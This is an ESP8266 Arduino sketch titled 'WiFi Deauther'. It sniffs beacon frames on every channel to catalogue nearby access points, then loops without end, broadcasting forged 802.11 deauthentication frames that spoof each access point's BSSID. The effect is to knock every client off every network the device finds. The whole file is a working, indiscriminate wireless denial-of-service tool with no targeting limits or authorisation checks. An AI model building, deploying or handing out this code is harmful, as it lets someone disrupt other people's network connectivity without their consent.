#ifdef ESP8266
extern "C" {
    #include "ets_sys.h"
    #include "osapi.h"
    #include "gpio.h"
    #include "os_type.h"
    #include "user_interface.h"
}
#endif

// RxControl structure definition
struct RxControl {
    signed rssi: 8;
    unsigned rate: 4;
    unsigned is_group: 1;
    unsigned: 1;
    unsigned sig_mode: 2;
    unsigned legacy_length: 12;
    unsigned damatch0: 1;
    unsigned damatch1: 1;
    unsigned bssidmatch0: 1;
    unsigned bssidmatch1: 1;
    unsigned MCS: 7;
    unsigned CWB: 1;
    unsigned HT_length: 16;
    unsigned Smoothing: 1;
    unsigned Not_Sounding: 1;
    unsigned: 1;
    unsigned Aggregation: 1;
    unsigned STBC: 2;
    unsigned FEC_CODING: 1;
    unsigned SGI: 1;
    unsigned rxend_state: 8;
    unsigned ampdu_cnt: 8;
    unsigned channel: 4;
    unsigned: 12;
};

// Constants
const int SIZE_LIMIT = 50;
const int CHANNEL_LIMIT = 14;
const int DEAUTH_PACKET_SIZE = 26;
const unsigned long DEAUTH_CYCLE_MS = 60000;
const int BEACON_LENGTH = 128;

// Channel Configuration
int currentAPIndex = -1;
int currentChannel = 1;
int channels[CHANNEL_LIMIT] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14};

// Timers
unsigned long deauthTimer = 0;

// Structure for sniffer buffer 2
struct sniffer_buf2 {
    struct RxControl rx_ctrl;
    uint8_t buf[112];
    uint16_t cnt;
    uint16_t len;
};

// AccessPoint class
class AccessPoint {
public:
    String essid;
    signed rssi;
    uint8_t bssid[6] = {0};
    int channel = 1;
    bool found = false;
    int channelUsage[CHANNEL_LIMIT] = {0};
    uint8_t deauthPacket[DEAUTH_PACKET_SIZE] = {
        0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
        0x00, 0x00, 0x01, 0x00
    };

    void setBSSID(const uint8_t newBSSID[6]) {
        memcpy(bssid, newBSSID, 6);
        memcpy(deauthPacket + 10, bssid, 6);
        memcpy(deauthPacket + 16, bssid, 6);
    }

    bool matchesBSSID(const uint8_t targetBSSID[6]) const {
        return memcmp(bssid, targetBSSID, 6) == 0;
    }

    void markAsFound() { found = true; }

    void updateChannelUsage(int newChannel) {
        channelUsage[newChannel - 1]++;
        channel = newChannel;
    }
};

// Access point array
AccessPoint accessPoints[SIZE_LIMIT];

// Send a deauthentication packet
void sendDeauthPacket(const AccessPoint &ap) {
    wifi_set_channel(ap.channel);
    delay(1);
    wifi_send_pkt_freedom((uint8_t *)(ap.deauthPacket), DEAUTH_PACKET_SIZE, 0);
}

// Add or update access point
bool addOrUpdateAccessPoint(const uint8_t bssid[6], int channel, const String &essid, signed rssi) {
    for (int i = 0; i <= currentAPIndex; ++i) {
        if (accessPoints[i].matchesBSSID(bssid)) {
            accessPoints[i].markAsFound();
            accessPoints[i].updateChannelUsage(channel);
            return false;
        }
    }

    currentAPIndex = (currentAPIndex + 1) % SIZE_LIMIT;
    AccessPoint &newAP = accessPoints[currentAPIndex];
    newAP.setBSSID(bssid);
    newAP.essid = essid;
    newAP.rssi = rssi;
    newAP.updateChannelUsage(channel);
    newAP.markAsFound();
    return true;
}

// Promiscuous callback function
void promiscCallback(uint8 *buf, uint16 len) {
    if (len == BEACON_LENGTH) {
        struct sniffer_buf2 *sniffer = (struct sniffer_buf2 *)buf;
        if (sniffer->buf[0] == 0x80) { // Check for beacon packet
            uint8_t bssid[6];
            memcpy(bssid, sniffer->buf + 10, 6);
            String essid;
            for (int i = 0; i < sniffer->buf[37]; ++i) {
                essid.concat((char)sniffer->buf[i + 38]);
            }
            addOrUpdateAccessPoint(bssid, currentChannel, essid, sniffer->rx_ctrl.rssi);
        }
    }
}

// Scan function
void scanAccessPoints() {
    wifi_promiscuous_enable(0);
    wifi_set_promiscuous_rx_cb(promiscCallback);
    wifi_promiscuous_enable(1);

    for (int i = 0; i <= currentAPIndex; ++i) {
        accessPoints[i].found = false;
    }

    for (int p = 0; p < CHANNEL_LIMIT; ++p) {
        currentChannel = channels[p];
        wifi_set_channel(currentChannel);
        delay(1000);
    }
}

// Setup function
void setup() {
    Serial.begin(115200);
    Serial.println("[!] WiFi Deauther\n[!] Initializing...\n\n");
    wifi_set_opmode(0x1);
    wifi_set_channel(currentChannel);
    scanAccessPoints();
    deauthTimer = millis();
}

// Main loop
void loop() {
    if (millis() - deauthTimer > DEAUTH_CYCLE_MS) {
        scanAccessPoints();
        deauthTimer = millis();
    }
    for (int i = 0; i <= currentAPIndex; ++i) {
        sendDeauthPacket(accessPoints[i]);
    }
    delay(1);
}
